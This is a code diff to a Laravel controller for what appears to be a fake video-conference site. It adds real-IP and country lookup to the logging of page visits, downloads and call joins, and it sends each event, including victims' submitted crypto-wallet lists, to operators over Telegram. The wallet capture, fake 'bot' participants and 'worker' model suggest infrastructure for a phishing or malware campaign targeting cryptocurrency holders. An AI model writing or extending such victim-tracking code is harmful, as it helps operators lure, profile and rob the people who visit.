@@ -8,6 +8,7 @@ use App\Models\Message;
 use App\Models\Visit;
 use App\Models\Download;
 use App\Services\TelegramService;
+use App\Helpers\IpHelper;
 use Illuminate\Http\Request;
 use Illuminate\Support\Str;
 use App\Models\Worker;
@@ -26,11 +27,17 @@ class ConferenceController extends Controller
     {
         $conference = Conference::findOrFail($conferenceId);
 
+        $realIp = IpHelper::getRealIp();
+        $countryInfo = IpHelper::getCountryInfo($realIp);
+        
         Visit::create([
             'type' => 'conference',
             'reference_id' => $conferenceId,
-            'ip_address' => request()->ip(),
-            'user_agent' => request()->userAgent()
+            'ip_address' => $realIp,
+            'user_agent' => request()->userAgent(),
+            'country' => $countryInfo['country'],
+            'country_code' => $countryInfo['country_code'],
+            'flag' => $countryInfo['flag']
         ]);
 
         // Отправляем уведомление в Telegram
@@ -38,8 +45,9 @@ class ConferenceController extends Controller
         $telegram->notifyPageVisit(
             'conference',
             $conference->invite_code,
-            request()->ip(),
-            request()->userAgent()
+            $realIp,
+            request()->userAgent(),
+            $countryInfo
         );
 
         return response()->json([
@@ -70,6 +78,9 @@ class ConferenceController extends Controller
     {
         $conference = Conference::findOrFail($conferenceId);
 
+        $realIp = IpHelper::getRealIp();
+        $countryInfo = IpHelper::getCountryInfo($realIp);
+        
         Download::create([
             'type' => 'conference',
             'reference_id' => $conferenceId,
@@ -77,7 +88,10 @@ class ConferenceController extends Controller
             'tag' => request()->input('tag'),
             'user_agent' => request()->userAgent(),
             'wallets' => request()->input('wallets', []),
-            'ip_address' => request()->ip()
+            'ip_address' => $realIp,
+            'country' => $countryInfo['country'],
+            'country_code' => $countryInfo['country_code'],
+            'flag' => $countryInfo['flag']
         ]);
 
         // Отправляем уведомление в Telegram
@@ -86,9 +100,10 @@ class ConferenceController extends Controller
             'conference',
             $conference->invite_code,
             request()->input('platform', 'unknown'),
-            request()->ip(),
+            $realIp,
             request()->userAgent(),
-            request()->input('wallets', [])
+            request()->input('wallets', []),
+            $countryInfo
         );
 
         return response()->json([
@@ -104,12 +119,16 @@ class ConferenceController extends Controller
             ->firstOrFail();
 
         // Отправляем уведомление о входе в звонок
+        $realIp = IpHelper::getRealIp();
+        $countryInfo = IpHelper::getCountryInfo($realIp);
+        
         $telegram = new TelegramService();
         $telegram->notifyConferenceJoin(
             $conference->title,
             $inviteCode,
-            request()->ip(),
-            request()->userAgent()
+            $realIp,
+            request()->userAgent(),
+            $countryInfo
         );
 
         $bots = $conference->bots()->get()->map(function ($bot) {
@@ -146,12 +165,16 @@ class ConferenceController extends Controller
             ->firstOrFail();
 
         // Отправляем уведомление о входе в звонок с именем
+        $realIp = IpHelper::getRealIp();
+        $countryInfo = IpHelper::getCountryInfo($realIp);
+        
         $telegram = new TelegramService();
         $telegram->notifyConferenceJoin(
             $conference->title . " (Пользователь: " . $request->name . ")",
             $inviteCode,
-            request()->ip(),
-            request()->userAgent()
+            $realIp,
+            request()->userAgent(),
+            $countryInfo
         );
 
         return response()->json([
